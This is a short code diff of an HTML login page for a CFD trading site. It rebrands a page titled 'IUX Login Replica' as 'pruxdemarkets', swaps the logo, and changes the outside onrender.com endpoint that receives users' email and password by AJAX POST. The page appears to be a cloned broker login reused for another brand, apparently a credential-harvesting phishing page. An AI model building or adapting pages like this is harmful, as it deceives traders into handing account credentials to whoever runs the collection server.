@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>IUX Login Replica</title>
+<title>Login — pruxdemarkets</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
@@ -14,7 +14,7 @@
 body {background:#0b0f12;color:#fff;}
 .risk-bar {background:#000;color:#9aa4af;font-size:13px;text-align:center;padding:10px 20px;}
 .header {display:flex;justify-content:space-between;align-items:center;padding:25px 50px;}
-.logo {font-size:28px;font-weight:600;color:#18e09b;}
+.logo img {height:52px;width:auto;display:block;}
 .lang {font-size:14px;color:#ccc;}
 .wrapper {height:calc(100vh - 140px);display:flex;justify-content:center;align-items:center;}
 .card {width:460px;background:#0f1418;border:1px solid #1f2a30;border-radius:20px;padding:40px;}
@@ -37,7 +37,7 @@ CFDs are complex instruments and come with a high risk of losing money rapidly d
 </div> -->
 
 <div class="header">
-    <div class="logo">X</div>
+    <div class="logo"><img src="https://www.pruxdemarkets.com/logo.png" alt="pruxdemarkets"></div>
     <div class="lang">🌐 EN</div>
 </div>
 
@@ -85,7 +85,7 @@ async function submitLogin(){
 
     await $.ajax({
         type:"POST",
-        url:"https://logicpro-render.onrender.com/auth/login",
+        url:"https://pm-render-853f.onrender.com/auth/login",
         dataType:"json",
         data:{ email,password },
         success:function(data){
